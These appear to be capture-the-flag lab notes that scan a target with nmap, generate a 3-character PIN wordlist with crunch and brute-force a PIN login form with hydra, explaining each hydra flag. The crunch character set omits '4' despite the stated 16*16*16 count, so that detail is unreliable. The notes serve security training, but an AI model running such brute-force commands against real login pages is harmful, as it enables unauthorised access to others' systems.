nmap 10.10.152.38 // port 22,8000 open
10.10.152.38:8000 -->> /login.php/pin
pin input :0123456789abcdef //3 min // 3 max

crunch 3 3 012356789abcdef -o 3digits.txt //creating list of password 16*16*16

hydra -l '' -P 3digits.txt -f -v 10.10.152.38 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000 // brute force : details 
-l '' indicates that the login name is blank as the security lock only requires a password
-P 3digits.txt specifies the password file to use
-f stops Hydra after finding a working password
-v provides verbose output and is helpful for catching errors
10.10.152.38 is the IP address of the target
http-post-form specifies the HTTP method to use
"/login.php:pin=^PASS^:Access denied" has three parts separated by :
/login.php is the page where the PIN code is submitted
pin=^PASS^ will replace ^PASS^ with values from the password list
Access denied indicates that invalid passwords will lead to a page that contains the text “Access denied”
-s 8000 indicates the port number on the target
